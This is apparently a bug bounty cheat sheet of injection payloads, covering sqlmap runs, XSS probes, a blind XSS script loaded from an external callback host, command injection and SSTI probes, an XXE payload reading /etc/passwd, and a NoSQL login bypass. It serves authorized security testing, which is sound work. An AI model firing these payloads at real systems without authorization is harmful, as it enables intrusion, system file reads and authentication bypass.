# Bug Bounty — Injection Vulnerabilities

### SQLMap full run against a suspected parameter

```
sqlmap -u "https://<target>/page?id=1" --level=3 --risk=2 --batch
```

**Use when:** Confirmed or strongly suspected SQL injection point — automate detection and DB enumeration.

---

### SQLMap through Burp-captured request

```
sqlmap -r request.txt --batch --dbs
```

**Use when:** You've captured a full request (with headers/cookies) in Burp and want SQLMap to reuse it exactly.

---

### Manual XSS probe payloads

```
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
```

**Use when:** Testing whether user input reflects unescaped into HTML context.

---

### Blind/stored XSS with an external callback

```
<script src="https://<your-xss-hunter-or-webhook>/x.js"></script>
```

**Use when:** You can't see the output directly (stored/blind XSS) — use a listener to confirm execution.

---

### Command injection probe payloads

```
; id
| id
`id`
$(id)
```

**Use when:** A parameter looks like it's passed to a shell command on the backend.

---

### XXE payload for XML input

```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**Use when:** An endpoint accepts raw XML and you want to test for external entity injection/file read.

---

### SSTI probe payloads (Jinja2/Twig/etc.)

```
{{7*7}}
${7*7}
<%= 7*7 %>
```

**Use when:** Input appears to be rendered through a server-side template engine.

**Note:** A returned `49` confirms SSTI — escalate to RCE payloads only within scope/authorization.

---

### NoSQL injection probe (MongoDB-style)

```
{"username": {"$ne": null}, "password": {"$ne": null}}
' || 1==1 //
```

**Use when:** Testing a login form backed by a NoSQL database for auth bypass.
